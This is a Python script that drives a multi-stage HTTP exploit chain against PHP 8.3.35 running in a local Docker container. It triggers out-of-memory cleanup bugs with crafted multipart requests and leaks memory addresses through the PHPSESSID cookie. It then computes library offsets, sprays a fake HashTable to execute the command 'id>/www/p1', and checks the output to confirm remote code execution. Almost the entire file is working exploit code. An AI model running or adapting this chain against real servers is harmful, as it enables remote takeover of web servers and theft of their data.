#!/usr/bin/env python3
"""Run 9bie's full pure-HTTP chain on 8.3.35 with correct offsets.

A1 (mk_a1.py) -> B1 (mk_leak_b.py) -> A2 (cheap_oom_a.py) -> B2 (fake_ref_b.py)
"""
import subprocess, sys, os, time, struct, socket, re, urllib.parse
from collections import Counter

PORT = 18112
CONTAINER = "p2s8335"
DTOR_OFFSET = 0x49ec50   # 8.3.35
ZIF_OFFSET = 0x3ac080    # 8.3.35
CMD = "id>/www/p1"
FETCH = "/p1"
S_OFFSET = 0xF8398       # from 8.4.26 calibration; may differ on 8.3.35

HERE = os.path.dirname(os.path.abspath(__file__))
GH = r"C:\Users\likat\.qwen\tmp\p2s"

def log(m): print(m, flush=True)

def run(script, args, timeout=300):
    cmd = [sys.executable, os.path.join(GH, f"gh_pure_{script}")] + args
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    out = (r.stdout or "") + (r.stderr or "")
    if r.returncode != 0:
        log(f"[-] {script} failed: {out[-200:]}")
    return r.returncode == 0, out

def send_body(port, body, path="/", timeout=120):
    boundary = b"C" * 10
    req = (f"POST {path} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n"
           f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
    resp = bytearray()
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(req + body)
        while len(resp) < (16 << 20):
            chunk = s.recv(65536)
            if not chunk: break
            resp.extend(chunk)
    except (OSError, ConnectionError): pass
    finally:
        try: s.close()
        except: pass
    return bytes(resp)

def parse_leak(resp):
    i = resp.find(b"Set-Cookie: PHPSESSID=")
    if i < 0:
        return None
    val = resp[i + len(b"Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
    dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))
    counts = Counter()
    for off in range(0, len(dec) - 8, 8):
        q = struct.unpack_from("<Q", dec, off)[0]
        if 0x7F0000000000 <= q <= 0x7FFFFFFFFFFF:
            counts[q] += 1
    if not counts:
        return None
    zdtor, n = counts.most_common(1)[0]
    lib = zdtor - DTOR_OFFSET
    buckets = Counter()
    for q, c in counts.items():
        b = q & ~0x1FFFFF
        buckets[b] += c
    lib_bucket = zdtor & ~0x1FFFFF
    id_bucket = buckets.most_common(1)[0][0] if buckets else 0
    cands = [(b, c) for b, c in buckets.most_common() if b not in (lib_bucket, id_bucket)]
    cands.sort(key=lambda bc: abs(bc[1] - 87))
    return {
        "decoded": len(dec),
        "zdtor": zdtor,
        "lib": lib,
        "buckets": buckets,
        "main_candidates": [b for b, c in cands[:3]],
    }

def get_proof(port):
    req = f"GET {FETCH} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nConnection: close\r\n\r\n".encode()
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=10)
        s.settimeout(10)
        s.sendall(req)
        data = b""
        while True:
            c = s.recv(65536)
            if not c: break
            data += c
        s.close()
        head, _, body = data.partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), body
    except: return 0, b""

def main():
    log(f"[*] 9bie chain on 8.3.35 (port {PORT})")
    log(f"[*] dtor=0x{DTOR_OFFSET:x} zif=0x{ZIF_OFFSET:x} S_offset=0x{S_OFFSET:x}")
    
    # Restart for clean state
    subprocess.run(["docker", "restart", CONTAINER], capture_output=True, timeout=30)
    time.sleep(2)
    
    # Warm up
    try:
        s = socket.create_connection(("127.0.0.1", PORT), timeout=5)
        s.sendall(b"GET /index.php HTTP/1.0\r\nHost: x\r\n\r\n")
        s.recv(1024); s.close()
    except: pass
    
    tmp = os.path.join(HERE, "tmp_8335")
    os.makedirs(tmp, exist_ok=True)
    
    for attempt in range(1, 4):
        log(f"\n[=== attempt {attempt}/3 ===]")
        
        # A1: END-cleanup OOM
        log("[*] A1: END-cleanup send_cookie OOM")
        a1 = os.path.join(tmp, "a1.bin")
        ok, out = run("mk_a1.py", ["--out", a1, "--big", "78"], timeout=60)
        if not ok:
            log(f"[-] A1 build failed"); continue
        # Send chunked (use chunked_send.py)
        ok, out = run("chunked_send.py", [
            "--port", str(PORT), "--body-file", a1,
            "--path", "/index.php?qqq=v&q1=v&q2=v&q3=v&q4=v",
            "--timeout", "180"
        ], timeout=200)
        log(f"    A1 sent: {out[-80:]}")
        time.sleep(0.3)
        
        # B1: stale-id OOB read
        log("[*] B1: stale-id OOB read")
        b1 = os.path.join(tmp, "b1.bin")
        LEAK_SPEC = ",".join(["G:511:0x137"]*14 + ["G:400:0x137", "G:511:0x137", "X:900"])
        ok, out = run("mk_leak_b.py", [
            "--out", b1, "--spec", LEAK_SPEC,
            "--fake-len", "0xC8000", "--tag"
        ], timeout=60)
        if not ok:
            log(f"[-] B1 build failed"); continue
        
        # Send B1 and parse leak
        leak_file = os.path.join(tmp, "leak.resp")
        ok, out = run("chunked_send.py", [
            "--port", str(PORT), "--body-file", b1,
            "--path", "/index.php", "--timeout", "120",
            "--save-response", leak_file
        ], timeout=150)
        
        if not os.path.exists(leak_file):
            log("[-] No leak response"); continue
        resp = open(leak_file, "rb").read()
        info = parse_leak(resp)
        if not info:
            log("[-] Leak parse failed"); continue
        
        log(f"    decoded={info['decoded']} zdtor=0x{info['zdtor']:x} lib=0x{info['lib']:x}")
        log(f"    buckets: {[(hex(b), c) for b, c in info['buckets'].most_common(6)]}")
        
        if not info["main_candidates"]:
            log("[-] No main chunk candidate"); continue
        
        main = info["main_candidates"][0]
        delta = info["lib"] - main
        log(f"    main=0x{main:x} delta=0x{delta:x}")
        
        # Sanity check delta (8.4.26 range: 0x1A00000-0x1F00000)
        if not (0x1000000 <= delta <= 0x3000000):
            log(f"    [!] implausible delta 0x{delta:x}, continuing anyway")
        
        zif = info["lib"] + ZIF_OFFSET
        
        for ci, cand in enumerate(info["main_candidates"][:2]):
            S = cand + S_OFFSET
            log(f"[*] A2+B2: main=0x{cand:x} S=0x{S:x} zif=0x{zif:x}")
            
            # A2: cheap OOM
            ok, out = run("cheap_oom_a.py", [
                "--port", str(PORT), "--parts", "880",
                "--depth", "64", "--fillers", "115"
            ], timeout=120)
            log(f"    A2: {out[-60:]}")
            time.sleep(0.3)
            
            # Build fake HashTable
            ht_file = os.path.join(tmp, "ht.bin")
            ok, out = run("mk_ht.py", [hex(S), hex(zif), CMD, ht_file], timeout=30)
            if not ok:
                log("[-] mk_ht failed"); continue
            
            # B2: fake reference spray
            ok, out = run("fake_ref_b.py", [
                "--port", str(PORT), "--vl", "384",
                "--n1", "500", "--n2", "495", "--rc", "1",
                "--ht-addr", hex(S), "--ht-file", ht_file
            ], timeout=120)
            log(f"    B2: {out[-80:]}")
            time.sleep(1)
            
            # Check proof
            status, body = get_proof(PORT)
            if status == 200 and b"uid=" in body:
                log(f"[+] RCE PROVEN! {body.decode('latin1').strip()}")
                return 0
            log(f"    candidate {ci} failed (no proof, status={status})")
        
        # Restart between attempts
        subprocess.run(["docker", "restart", CONTAINER], capture_output=True, timeout=30)
        time.sleep(2)
    
    log("\n[-] All attempts failed")
    return 1

if __name__ == "__main__":
    sys.exit(main())
